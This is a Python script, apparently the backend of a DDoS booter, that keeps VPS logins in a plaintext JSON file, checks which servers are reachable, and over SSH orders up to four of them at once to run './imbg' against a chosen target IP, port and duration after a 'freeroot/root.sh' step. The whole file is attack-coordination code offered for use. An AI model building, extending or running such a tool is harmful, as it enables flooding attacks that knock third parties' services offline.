import paramiko, threading, json, socket, os

VPS_FILE = "vps_list.json"
MAX_VPS = 4  # max per task

# 📁 Auto-load/create VPS list
def load_vps():
    if not os.path.exists(VPS_FILE):
        with open(VPS_FILE, "w") as f:
            json.dump([], f)
    with open(VPS_FILE) as f:
        return json.load(f)

def save_vps(data):
    with open(VPS_FILE, "w") as f:
        json.dump(data, f)

# ➕ Add VPS
def add_vps(ip, user, pw):
    vps = load_vps()
    for v in vps:
        if v["ip"] == ip:
            return  # prevent duplicates
    vps.append({"ip": ip, "user": user, "pass": pw})
    save_vps(vps)
    print(f"[LOG] VPS Added: {ip}")

# ➖ Remove VPS
def remove_vps(ip):
    vps = load_vps()
    vps = [v for v in vps if v["ip"] != ip]
    save_vps(vps)
    print(f"[LOG] VPS Removed: {ip}")

# 🔁 Run shell task on 4 VPS max
def task_runner(vps, cmd):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps["ip"], username=vps["user"], password=vps["pass"], timeout=5)
        final_cmd = f"cd freeroot && ./root.sh && cd M && {cmd}"
        ssh.exec_command(final_cmd)
        ssh.close()
        print(f"[OK] Task sent to {vps['ip']}")
    except Exception as e:
        print(f"[ERR] {vps['ip']} failed: {e}")

def run_task(ip, port, dur):
    cmd = f"./imbg {ip} {port} {dur} 25"
    vps_list = load_vps()
    if not vps_list:
        return 0

    selected = []
    for v in vps_list:
        try:
            s = socket.create_connection((v["ip"], 22), timeout=1)
            s.close()
            selected.append(v)
        except:
            print(f"[SKIP] {v['ip']} is offline.")
        if len(selected) >= MAX_VPS:
            break

    threads = []
    for v in selected:
        t = threading.Thread(target=task_runner, args=(v, cmd))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    return len(selected)

# 📡 Check VPS online/offline
def get_vps_status():
    vps = load_vps()
    total = len(vps)
    online = 0
    for v in vps:
        try:
            s = socket.create_connection((v["ip"], 22), timeout=1)
            s.close()
            online += 1
        except:
            pass
    return f"📡 VPS Status:\nTotal: {total}\n🟢 Online: {online}\n🔴 Offline: {total - online}"
